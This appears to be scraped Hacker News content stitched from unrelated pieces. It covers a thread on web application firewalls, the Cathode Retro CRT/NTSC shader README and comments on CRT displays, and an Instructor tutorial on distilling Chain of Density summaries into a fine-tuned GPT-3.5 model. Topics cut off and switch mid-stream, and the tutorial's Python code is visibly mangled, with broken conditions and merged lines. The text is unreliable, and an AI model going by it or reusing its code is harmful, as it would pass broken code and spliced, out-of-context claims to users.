CloudFlare did [1] and transpile all the slow ModSecurity rules to Lua and deploy OpenResty at the edge.

A WAF will protect you from unsophisticated attackers - at great cost.In my group, I am considered to be the WAF SME. Enough that I wrote a training course to get into ruleset tuning.What I see a lot is customers who are security-focused demanding \"OWASP Top 10\" protection and then, somehow, not understanding that it is not 10 rules you enable on the WAF. These are people often with application security and other credentials.Most people I have seen running WAF&#x27;s are in \"Set it and forget it\" mode. Tune the rules until it no longer blocks legitimate traffic and call it a day. I think few really understand what it is, and the why of using them.Another funny anecdote: I had one of these customers talk about how amazing Akamai WAF was, because it never had false positives. Never? Really? That looks like a red flag to me, but they were not concerned. reply throwawaaarrgh 11 hours agoprevShow me an alternative that I can deploy despite developers having both the lack of knowledge and complete indifference of security. They don&#x27;t care and they aren&#x27;t forced to conform to any security standards, so a WAF is literally the only thing I can do to try to improve things. I can&#x27;t rewrite all their code for them. Management hears about a WAF and makes that a requirement and moves on.If software development was a professional trade group, we could make membership require security training, and industry standards for ensuring security. But that&#x27;ll never happen. It would mean them giving themselves more work to do, and we all know how lazy devs are. reply Cpoll 11 hours agoparent> Management hears about a WAF and makes that a requirement and moves on.In this case, a WAF is giving the illusion of safety. So I feel like you&#x27;re actually making an argument against WAFs. reply ppierald 12 hours agoprevA few points.PCI-DSS does not mandate the use of a WAF. It is one of two ways you can fulfill requirement 6.5 or 6.6. WAF + OWASP Top Ten ruleset is typically easier to get evidence for your auditor, but you can show that continuous scanning using a DAST scanning engine to meet requirements.I would have a WAF installed with very few highly tuned rules against mostly SQLi. Why? Because the damage of letting that through and praying that the developer or web-app framework does it right are significant. The rules for SQLi are pretty easy to get right and dropping that traffic before it gets to your web server is a reasonable thing.I would have a WAF installed with no rules too. It is nice to have something there where you can drop in a Log4J rule and get protection relatively quickly for attacks of that nature. There have been a number of these over the years and a small performance penalty seems worth the big picture safety net.I am against the pricey models that the cloud vendors push. WAF can get expensive. They typically are bundled with other cloud services, but hey, if you&#x27;ve gotten that far, you are probably outsourcing most things to the cloud provider anyway.I do not like WAF pragmatically because it lets the developer off the hook in many ways. There is something there doing their work for them and another reason for some developers to not understand or care about the security of their applications. Something else will do it for me whether I know this or not. reply KronisLV 12 hours agoprevThere was a point in the article about WAFs being quite slow, in particular the article talks about Nginx with ModSecurity.However, some benchmarks from a while ago suggested that Nginx performs worse with ModSecurity than Apache does in a similar configuration: https:&#x2F;&#x2F;blog.litespeedtech.com&#x2F;2019&#x2F;12&#x2F;02&#x2F;modsecurity-perfor...Seems like Coraza also has some more recent benchmarks, since from what I can tell they more or less aim to replace ModSecurity in some regards: https:&#x2F;&#x2F;coraza.io&#x2F;docs&#x2F;reference&#x2F;benchmarks&#x2F;I wonder whether anyone has undertaken the effort to compare the performance of the self-hosted WAF options in 2023, or at least in the past few years.Personally, I think the performance tradeoff might sometimes be worth it if security does indeed improve, the Swiss cheese model (defense in depth) and all that: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Swiss_cheese_model reply asylteltine 12 hours agoprevThese are pretty weak arguments.

Especially for small teams working with large piles of software (lookin&#x27; at you WordPress) that are insecure out of the box. The ideas are also constrained mainly to fixing SQL injections, which are only an aspect of security.* Isolate components in case of a breach That&#x27;s great but it doesn&#x27;t fix a breach, it just limits the scope. Better than nothing but if a WAF stops the breach from happening ...?* Immutability Cool for those teams that have control of their entire infrastructure. However this also only solves those cases that are caused by mutability.* Static analysis to look for stuff like devs forgetting to use prepared statements. Definitely! Sure! But again, if you&#x27;re using a piece of software off the shelf a lot of that is out of your hands.* Restricting API endpoints to limit access to necessary tables Another great idea if you are in control of your software.

They almost always create false positives &#x2F; false negatives when Parameterised queries are used incorrectly.

    "originBody": "Table of Contents Introduction Screenshots Features Contents and Usage Using the C++ Code Roadmap License Introduction Cathode Retro is a collection of shaders that combine to emulate the properties and artifacts of a color NTSC TV signal as well as the visual look of a Cathode-Ray Tube (CRT) TV. Screenshots (click screenshots for full-sized version) Screenshot from Mop of Destiny Image of Amarelo tileset by Adam Saltsman Image of Kyst tileset by Adam Saltsman Screenshot from an old, unreleased brick-breaking game Features Emulate composite and S-Video NTSC signals Using any RGB source At arbitrary resolutions (not limited to standard NTSC limitations) Built-in scanline timings to emulate NES/SNES and PC Composite (320- and 640-wide) displays, but flexible enough to emulate any timings Noise, picture instability, and ghosting for that \"my TV has bad reception\" feel Tint/Saturation/Brightness/Sharpness \"knobs\" controls, like a TV had!

Contents and Usage This repository contains: Shaders: All of the shader source files While the shader files' extension is hlsl, these shaders will compile as either HLSL or GLSL, due to some macros in cathode-retro-util-language-helpers.hlsli Compiling the shaders as HLSL requires an HLSL preprocessor definition be added (either by the compiler via the command line or manually at the top of cathode-retro-util-language-helpers.hlsli Compiling for GLSL requires a loader that handles #include directives, as well as requires a #version directive (at least #version 330 core). See GLHelpers.h in Samples/GL-Sample for an example of this if needed Include/CathodeRetro: Header-only C++ code to support a CathodeRetro::CathodeRetro class that handles running all of the shader stages for the full effect. Code requires at least C++14, and has been tested in Visual Studio 2022, and with Clang 9, Clang 17, GCC 8.1, and GCC 13.2 More instructions on how to use the C++ code in the next section Samples: Some C++ samples for how to use Cathode Retro D3D11-Sample: A sample Visual Studio 2022 project that runs Cathode Retro in Direct3D 11, as HLSL shaders GL-Sample: A sample Visual Studio 2022 project that runs Cathode Retro in OpenGL 3.3 core Sorry, Linux/Mac users: the demo code is rather Windows-specific at the moment, but hopefully it still gives you the gist of how to hook everything up Using the C++ Code A small overview of using the C++ code can be found here. More extensive documentation coming soon! Roadmap Some things that are on the list to do at some point: Add more preset NTSC timing data (for instance, get the timings for Sega Genesis games, so that emulators will get that classic rainbow-like waterfall effect in Sonic) Add additional input types (not just RGB) The NES outputs in effectively 9-bit color (6 bits of color palette space plus 3 bits for \"color emphasis\"), and the signal can be generated direct from that CGA cards had two different modes of generating a composite signal, and to truly get accurate colors for composite artifact color tricks that old PC games like Maniac Mansion used, the signal would have to be generated in the same way Add ability to decode a real NTSC signal - Rather than using the Generator shaders to create NTSC scanlines, it's absolutely possible to take a true NTSC signal, slice it up into scanlines, and then run it directly into the Decoder shaders This would likely require a resampler from whatever the input rate is into one where the color carrier frequency is a nice even value like 4 or 8 texels (the generator by default uses 4). Additionally detecting the various different ways that devices generated their scanlines, both for standard interlaced signals and the \"240p\" modes that consoles tended to use. This is code that I have half-working using the output of an oscilloscope that I can hook a console up to, but it's sort of hacked together at the moment. Integration into some existing emulators It's totally possible to get these into something like RetroArch, but it's not quite as easy as just dropping the shaders in, requiring a little bit of redo on some of the shaders (one in particular is intended to run once for any given output screen resolution as it would be expensive to run every frame).

Old graphics and videos from the \"time before\" rely a bit on how those display systems and signals worked in order to make low-color and resolution artifacts look \"better\" in terms of smoother color gradients and softer edges and diagonals. The shift to modern displays mades everything form that era look blocky and chunky.The thing that makes this all really \"meta-interesting\" is that everybody who remembers that time remembers it differently and so there&#x27;s no \"correct\" way to do this. We all had different TVs, monitors, different manufactures from different time periods. Some of us played color 16-bit games on tiny black and white TVs, or remember the flicker of the Atari 2600 on a giant RGB front-projection TV.As a result we have literally thousands of filters like this that try to reproduce or at least model how these old systems looked to give back some semblance of what we remember, even if it&#x27;s all entirely wrong.I found after experimenting with a bunch of this that what seems to be more important than all the phosphor glow, scan lines, and shadow mask stuff, is that the display has to be curved for it to finally click with me. And then having reflections of the screen in the bezel are chef&#x27;s kiss. It&#x27;s so subtle, but just those two effects alone seem to do more for me personally than the rest.The Megabezel project is dedicated to what I&#x27;m talking about.http:&#x2F;&#x2F;www.megabezel.com&#x2F; reply andai 12 hours agoparent>having reflections of the screen in the bezel are chef&#x27;s kissAt first I thought this was a strange thing to ask for, but then I saw the image in the link and suddenly I agree 100%.

Perhaps more so with young observers. reply PumpkinSpice 8 hours agoparentprevI&#x27;d go a bit further with this claim. Most of what&#x27;s being done in this space is about inventing new retro aesthetics, not about faithfully approximating how things worked in the 1980s and 1990s. For example, color TVs of that era didn&#x27;t really have pronounced scanlines. They also didn&#x27;t have thick, lightly-colored, reflective bezels.I get that it looks cool and makes old games more aesthetically pleasing. But the reality is that we liked these visuals back then because we had much lower standards, not because CRTs had some magical properties that made the games look awesome. reply kevin_thibedeau 5 hours agorootparentArcade machines running 240p definitely had pronounced scanlines. reply smusamashah 10 hours agoparentprevAs someone else commented, this is what shaders are supposed to do with games from that time https:&#x2F;&#x2F;wackoid.com&#x2F;game&#x2F;10-pictures-that-show-why-crt-tvs-a...Notice how the physics of CRT ends up rendering the pixel art the way it was meant to appear.

Most CRT simulators introduce too much degradation by comparison. This one looks pretty good. reply fjfaase 20 hours agoprevNTSC was also known for its poor colour reproducability compared to PAL due to how the color signal was modulated. PAL had automatic control where NTSC often required manual adjustment in case the hue was drifted. For that reason NTSC was often said to stand for &#x27;Never Twice the Same Color&#x27; or &#x27;Never The Same Color&#x27;.I wonder if any of the shaders also has this behavior of randomly shifting the hue or an ability to change it by a give offset. reply kloch 15 hours agoparentNTSC colors were bad - really bad - but wideband bayer filters + sRGB are the source of the mediocre colors we see today.We could have beautiful Kodachrome quality colors If we used narrow-band RGB filters and a wide gamut (Rec.2020, or Rec.2100PQ) colorspace. If you look at the spectral sensitivity specs of Kodachrome film they are fairly narrow-band and closely matched the perceptual sensitivity of human vision (CIE 1931).If you display an sRGB encoded image with Rec.2020 gamut (without colorspace conversion) the colors will appear very washed out. If you display a Rec.2020 encoded image on sRGB (without colorspace conversion) it will appear oversaturated. Separately, narrower and&#x2F;or more widely spaced bandpass filters will increase color saturation. It turns out that narrow-band filters approximating the CIE1931 curves are a natural match for the Rec.2020 colorspace. Since CIE1931 approximates how humans perceive color the colors are also more accurate.It was a \"lucky\" accident that the properties of CRT phosphors, from which sRGB is derived were a good match for the wideband color filters used in color video cameras. reply zokier 12 hours agorootparentThere is good reason why many high end projectors use lasers as light sources these days; you can&#x27;t get much more narrow-band than that.https:&#x2F;&#x2F;www.christiedigital.com&#x2F;about&#x2F;display-technology&#x2F;las...https:&#x2F;&#x2F;www.barco.com&#x2F;en&#x2F;inspiration&#x2F;news-insights&#x2F;barco-res... reply c-hendricks 19 hours agoparentprevRetroarch does have some NTSC filters (combined with svideo&#x2F;composite input) that are appropriately noisy. reply phkahler 19 hours agoparentprevFair point for home games. Arcade games skipped NTSC and just used RGB on separate wires. reply orbital-decay 17 hours agorootparentA lot of home hardware had RGB as well. The variety of hardware in general was pretty high, to the point that many tricks pixel artists employed only worked on very specific hardware combinations. Case in point:https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=j-G02cjXpZ0Notice the glass tubes at 0:47+. On the composite output, they look smooth and have that rainbow effect.

Tne higher the resolution, the less visible it will be, but it probably requires around 300 DPI to become imperceptible. reply dylan604 19 hours agoprevI&#x27;d love to see an option to have the image pincushion and introduces a buzz in the audio from an video signal that was too strong? That was one of my favorite. Everyone focuses on the interlacing, giant pixels shapes, and the fun with chroma bleed, but some of the most bizarre things could happen when you pushed the analog signal too far. The 1 volt peak-to-peak was a rule for a reason, and going past was possible. Terms like whiter-than-white from pushing the video signal from a test pattern past 100ire on a scope could cause issues with the combined RF modulated audio&#x2F;video signals. The most flagrant offender was white text. If you were competent at your job, you never used 8-bit 255,255,255 for white. That was out of bounds for NTSC, so 235,235,235 was typical instead for white.The next filter would be the infamous \"broadcast safe\" filter that would clamp the video signal to video was not higher than 100ire. Allowing for chroma clamping separate from video clamping would be a bonus. Hell, just give the basic functions of a TBC to the users. They don&#x27;t need to understand what they are doing to the signal so much as just a few knobs to get creative! reply foobiekr 15 hours agoparentThe horrible sound of high frequency CRT screaming meant that I couldn‚Äôt go into many electronics areas or stores until the nineties. reply contravariant 15 hours agorootparentUnbearable high frequency noise does tend to fix itself given a few decades or so. reply dylan604 14 hours agorootparentThey were referring the fact that CRTs went the way of the dodo, and flat panels replaced them.

I could do it in the dark just by listening for this noise and know if any where on or not. Some of the reference monitors were never turned off though, and I had to ensure they had the correct signal routed to them to avoid burn-in. reply mytailorisrich 13 hours agorootparentprevI had an Atari ST in the living room and sometimes I would forget to turn the monitor off when I went to bed... but I was always reminded by the high pitch noise I could hear all the way in my bedroom. reply 0134340 10 hours agoparentprevAudio buzz emulation has been done already with a Gameboy emulator and from what I could recall when trying it, it was pretty dead-on.

Pushing the red channel 0.05f and the blue channel -0.05f on the x axis should do the trick. reply dylan604 15 hours agorootparentThere&#x27;s a fun technique in After Effects to separate the image by channels, and then apply an effect turning the image into grids of small circles. Nudge the red a couple of pixels left, the blue a couple of pixels right, and then the green a couple of pixels up. When these are merged back, you get that very look you&#x27;ve described. reply reactordev 13 hours agorootparentYeah, we can do it in the shader by taking the UV texcoord, sampling the texture rgb, then using a collector, add the r, g, b values to the collector with the offsets in uv&#x27;s to return the pixel color. It&#x27;s extremely easy to do in HLSL&#x2F;GLSL&#x2F;WGSL&#x2F;SPIRV&#x2F;Metal. It can even be controlled using a vector map for the offsets so you can tune it and vignette the chromatic aberration around the edges of the screen. Giving it that truly retro CRT arcade feel.

There is something so nostalgic about them that matches the warmth of listening to my favorite vinyl. I have had much more fun playing SNES and Genesis via my MiSTer on a PVM than I have had playing most modern games on an OLED display (although OLED is unquestionably beautiful, and I&#x27;m looking forward to the OLED Steam Deck).My biggest concern with my current setup is what will happen when my PVM dies? Will there be anyone around to fix it? Will I trust myself to safely open it up and fix it? The PVM I have isn&#x27;t _too_ large, but it&#x27;s certainly more heavy and inconvenient than a modern display.

This may work better on a yet even higher resolution display, or perhaps there&#x27;s an option to reduce the shadow mask effect. The other thing that this emulation can&#x27;t get right is that phosphor-based displays had more vibrant colors (at lower intensities) than currently popular (IPS) LCD panels. VA panels are better for this. reply crazygringo 17 hours agoparent> The shadow mask is overly represented.Is it? When I look up \"CRT macro lens\" on Google Images [1] the shadow mask is extremely pronounced -- possibly even more than here.I&#x27;ve just tried looking at the screenshots on both a Retina and non-Retina display, and they seem pretty faithful to what I remember growing up. I&#x27;m really quite impressed.Also -- what do you mean by \"more vibrant colors\"? If you mean (presumably) greater color saturation = wider color gamut, I can&#x27;t find any source supporting the idea that CRT&#x27;s had a wider gamut than modern IPS panels -- to the contrary, IPS seems to be at least as good if not better (although early LCD displays weren&#x27;t). And P3 IPS displays like Apple&#x27;s certainly blow CRT color gamuts out of the water.[1] https:&#x2F;&#x2F;www.google.com&#x2F;search?q=crt+macro+lens&tbm=isch reply karmakaze 10 hours agorootparentThe vertical RGB shadow mask specifically wasn&#x27;t unconsciously visible at normal viewing distance--usually only the raster lines were. On these screenshots, I can see and almost count horizontal pixels. This could also be because most shadow masks weren&#x27;t the RGB stripes like most LCDs--the Trinitron was with a cylindrical CRT. The shadow mask was usually also more fine than the max resolution so there was no 1:1 (or 3:1) mapping to pixels as there is in this simulated display.I don&#x27;t mean wider color gamut, I mean that for lower intensities, the saturation can remain high. Most current IPS panels at lower intensities, the color saturation gets washed out (think DLP projector). This correlates with having deep AND distinguishable blacks. IPS has high brightness, VA has higher contrast ratios.Because of this, I probably won&#x27;t buy an IPS panel except for &#x27;business&#x27; text use.The LG&#x2F;Dell Nano IPS Black (aka IPS Black and different than Nano IPS) is reported as being better--I haven&#x27;t seen it in person so can&#x27;t comment. reply masswerk 16 hours agorootparentprevMind that CRTs had a viewing distance, much like the subject point in classic painting. E.g., at this distance, dithering tended to blend into a solid tint on common consumer CRTs. (The granularity of a shadow mask is generally smaller than that of a pixel&#x2F;PEL, so there are actually two kinds of rasterization involved, which helps blending. The effect also depends on the shape of the mask, as in round, oval, square holes, or even a Trinitron-style wire mesh.) Also, the expectation to actually perceive CRT colors when reproduced on a modern panel may be overly optimistic.I&#x27;m generally impressed by these shaders (they are about the best, I&#x27;ve seen), but I also think that colors are too muted and that the mask is overrepresented.Edit: Regarding CRT intensities, mind that a CRT set up for daylight viewing would give you headaches when viewed in the dark, which is hard to achieve with a modern display panel. reply crazygringo 16 hours agorootparent> Regarding CRT intensities, mind that a CRT set up for daylight viewing would give you headaches when viewed in the dark, which is hard to achieve with a modern display panel.Are you suggesting CRT&#x27;s were brighter than modern LCD screens?That&#x27;s not the case at all. Average consumer CRT&#x27;s were 100 nits, the super-bright ones in the 2000&#x27;s around 200 nits. While your cheapest MacBook is 400 nits, and iPhones have been over 600 for a long time.

And I&#x27;ve never seen anybody demonstrate it with a 2x2 example like that.Super Mario on a crisp LCD has always seemed aesthetically better than on a CRT. Not as nostalgic, sure.

By the end you'll end up with a GPT 3.5 model, (fine-tuned using Instructor's great tooling), capable of producing summaries that rival the effectiveness of Chain of Density [Adams et al. (2023)]. As always, all code is readily available in our examples/chain-of-density folder in our repo for your reference. Datasets and Colab Notebook Part 1) Chain of Density¬∂ Summarizing extensive texts with AI can be challenging, often relying on inconsistent techniques. Their novel method, Chain Of Density prompting, enhances AI-based text summarization, outperforming human-generated summaries. Initially, an AI produces a summary, then refines it through multiple iterations, adding missing article entities. Each iteration adds new article entities to the summary, keeping length consistent, leading to an entity-dense, informative summary called Chain Of Density. First introduced in the paper - From Sparse to Dense: GPT-4 Summarization with Chain of Density Prompting. The team has found that this method is able to consistently beats similar summaries written by human annotators. Implementation Details Original Prompt¬∂ We can break down the original process into smaller api calls. This allows us to introduce validation at each step to ensure that we're getting the results that we want. Original Chain of Density Prompt Improved process with Instructor Data Modelling¬∂ Before we begin modelling the data, let's make sure we install all of our dependencies pip install instructor aiohttp rich Initial Summary¬∂ Let's start by walking through some of the data models that we'll be using as the response_model for our open ai function calls Firstly, we'll need a data model for the initial summary that we will be generating. We'll take the description of this class straight from the original prompt. It's important to note that these docstrings serve a purpose, they are directly used by the LLM when generating the outputs. A quick note on Docstrings class InitialSummary(BaseModel): \"\"\" This is an initial summary which should be long ( 4-5 sentences, ~80 words) yet highly non-specific, containing little information beyond the entities marked as missing. Use overly verbose languages and fillers (Eg. This article discusses) to reach ~80 words. \"\"\" summary: str = Field( ..., description=\"This is a summary of the article provided which is overly verbose and uses fillers. It should be roughly 80 words in length\", ) Rewritten Summary¬∂ We'll also need one additional class to help model the rewritten schema class RewrittenSummary(BaseModel): \"\"\" This is a new, denser summary of identical length which covers every entity and detail from the previous summary plus the Missing Entities. Guidelines - Make every word count : Rewrite the previous summary to improve flow and make space for additional entities - Never drop entities from the previous summary. If space cannot be made, add fewer new entities. - The new summary should be highly dense and concise yet self-contained, eg., easily understood without the Article. - Make space with fusion, compression, and removal of uninformative phrases like \"the article discusses\" - Missing entities can appear anywhere in the new summary An Entity is a real-world object that's assigned a name - for example, a person, country a product or a book title. \"\"\" summary: str = Field( ..., description=\"This is a new, denser summary of identical length which covers every entity and detail from the previous summary plus the Missing Entities. It should have the same length ( ~ 80 words ) as the previous summary and should be easily understood without the Article\", ) absent: List[str] = Field( ..., default_factory=list, description=\"this is a list of Entities found absent from the new summary that were present in the previous summary\", ) missing: List[str] = Field( default_factory=list, description=\"This is a list of 1-3 informative Entities from the Article that are missing from the new summary which should be included in the next generated summary.\", ) Using Pydantic Validators with Instructor For a more in-depth walkthrough on how to use Pydantic validators with the Instructor library, we recommend checking out our previous article on LLM validation - Good LLM Validation is just Good Validation Ideally, we'd like for Missing to have a length between 1 and 3, Absent to be an empty list and for our rewritten summaries to keep a minimum entity density. With Instructor, we can implement this logic using native Pydantic validators that are simply declared as part of the class itself. import nltk import spacy nlp = spacy.load(\"en_core_web_sm\") @field_validator(\"summary\") def min_length(cls, v: str): tokens = nltk.word_tokenize(v) Similar to the original paper, we utilize the NLTK word tokenizer to count the number of tokens within our generated sentences. We aim for at least 60 tokens in our generated summary so that we don't lose information. num_tokens = len(tokens) if num_tokens0: print(f\"Detected absent entities of {absent_entity_string}\") raise ValueError( f\"Do not omit the following Entities {absent_entity_string} from the new summary\" ) return absent_entities @field_validator(\"summary\") def min_entity_density(cls, v: str): tokens = nltk.word_tokenize(v) num_tokens = len(tokens) # Extract Entities doc = nlp(v) We also use the spaCy library to calculate the entity density of the generated summary. num_entities = len(doc.ents) density = num_entities / num_tokens if densityGeneratedSummary: summary_chain: List[str] = summarize_article(text) return GeneratedSummary(summary=summary_chain[-1]) We add in an instructions.distil annotation so that we automatically capture the input and output of the function we'd like to fine-tune our model to output with open(\"train.csv\", \"r\") as file: reader = csv.reader(file) next(reader) # Skip the header for article, summary in reader: # Run Distillisation to generate the values distil_summarization(article) Rate Limiting We recommend running this script on a small subset of the dataset first to test you've got everything configured nicely. Don't forget to add in rate limiting error handling with tenacity and set the OPENAI_API_KEY shell environment variable before running any subsequent commands Creating Fine-Tuning Jobs¬∂ Once we run this script, we'll have a new file called generated.jsonl in our local repository. Now all that's left is to run the command below to start fine-tuning your first model! instructor jobs create-from-file generated.jsonl Finetuning Reference Once the job is complete, all we need to do is to then change the annotation in the function call to distil_summarization in our original file above to start using our new model. @instructions.distil(model='gpt-3.5-turbo:finetuned-123', mode=\"dispatch\") Don't forget to replace this with your new model id. OpenAI identifies fine tuned models with an id of ft:gpt-3.5-turbo-0613:personal:: under their Fine-tuning tab on their dashboard def distil_summarization(text: str) -> GeneratedSummary: summary_chain: List[str] = summarize_article(text) return GeneratedSummary(summary=summary_chain[-1]) With that, you've now got your own fine-tuned model ready to go and serve data in production. We've seen how Instructor can make your life easier, from fine-tuning to distillation. Results and Benchmarks¬∂ We'l be comparing the following models in 3 ways using 20 articles that were not used for fine-tuning. Entity Density : This is entities per token, the higher the better for density. Latency : Time to last token generated in seconds Costs : Total cost to generate outputs - we break down the cost into training and inference costs for easy reference 3.5 Finetuned (n) This is a GPT 3.5 model that we fine-tuned on n examples. Each model was finetuned for 4-5 epochs ( This was automatically decided by the OpenAI scheduler ) GPT-4 (COD) This is a GPT4 model which we applied 3 rounds of Chain Of Density rewrites to generate a summary with using the methodology above GPT-3.5 (Vanilla) This is a GPT 3.5 model that we asked to generate entity-dense summaries which were concise. Summaries were generated in a single pass targetting about 80-90 tokens. Model Mean Latency (s) Mean Entity Density 3.5 Finetuned (20) 2.1 0.15 3.5 Finetuned (50) 2.1 0.14 3.5 Finetuned (76) 2.1 0.14 GPT-3.5 (Vanilla) 16.8 0.12 GPT-4 (COD) 49.5 0.15 Finetuning Datasets Using the OpenAI Usage Dashboard, we can calculate the cost of generating 20 summaries as seen below. Model Training Cost ($) Inference Cost ($) Tokens Used Total Cost ($) GPT-3.5 (Vanilla) - 0.20 51,162 0.2 3.5 Finetuned (20) 0.7 0.20 56,573 0.8 3.5 Finetuned (50) 1.4 0.17 49,057 1.3 3.5 Finetuned (76) 1.8 0.17 51,583 2.5 GPT-4 (COD) - 12.9 409,062 12.9 Here, we can see that GPT-4 has an approximate inference cost of 0.65 per summary while our finetuned models have an inference cost of 0.0091 per summary which is ~ 72x cheaper. Interestingly, the model finetuned with the least examples seems to outperform the others. While the reason for this is unknown, a few potential reasons could be that either we didn't train for sufficient epochs ( We chose the default 5 epochs ) or that the models started learning to imitate other behaviour such as more abstract writing styles from the larger variety of samples, resulting in a decrease in entity density. Conclusions¬∂ Finetuning this iterative method was 20-40x faster while improving overall performance, resulting in massive efficiency gains by finetuning and distilling capabilities into specialized models.

Partly because most datasets assume sentence level extractive summarization, which is often not how humans summarize documents.There&#x27;s still tons of very low hanging fruit in the summarization work. I&#x27;m not aware of significant followup work to pointer networks besides pointer-generator networks, which these days are considered old news. Pointer based architectures are the ideal system for word level extractive summarizers, yet the very best extractive summarization systems today are usually nothing more than sentence selectors using some kinds of embeddings and cosine similarity.Happy to see such success with abstractive summaries, but the kind that myself and most other humans are interested in is still far from solved. reply msp26 16 hours agoparentCould you point me to more reading on extractive summarisation?

ML models are usually trained to learn a model of the environment by giving them environment data. I would have expected feeding it model outputs just trains it to learn a model of the model creating the data.Without seeing some kind of demonstration otherwise, my feeling is that it would be like regressing stock price on inflation, then trying to generate more data using the regression model and random inflation numbers. All you&#x27;d learn is the model that you put in to generate the data. reply valine 13 hours agorootparentI&#x27;d think of it less like teaching the model something new, and more like enforcing a behavior the model can already output. Any decent raw model can output function names and parameters with prompt engineering. To do function calling, you need the model to output function names reliably for a wide variety of prompts. That&#x27;s where the fine-tuning comes in. reply just_boost_it 12 hours agorootparentI could very easily believe that if I saw proof, but it just feels a bit wrong to train a model on model outputs.Even in the main article here, the model did better with fewer fine tuned examples. To us, the auto-generated examples might look different enough and might look good enough, but they were all generated algorithmically. Feeding more examples in might easily be leading it to focus on some artifact of the embeddings or generating model that we just don&#x27;t perceive. reply visarga 12 hours agorootparent> it just feels a bit wrong to train a model on model outputsIf you have a small student model and a large teacher it makes sense, the student is better off after this distillation.If you have a way to filter out low quality synthetic examples then it would be useful to generate a bunch more and take the best.If your LLM is an agent, then it can generate feedback signals from the environment. Even a human-AI chat is a form of environment for the model. Every human response can be evaluated as positive or negative reward.More fundamentally, organic datasets are very unbalanced, LLMs need more complex reasoning chains than what is usually available. There are some exceptions - in scientific papers, manuals and code you get very complex reasoning chains. But not in general. This issue can be fixed with synthetic data.And even in principle, if you have a model at level N and want to make a dataset at level N+1, then you need to boost your model.
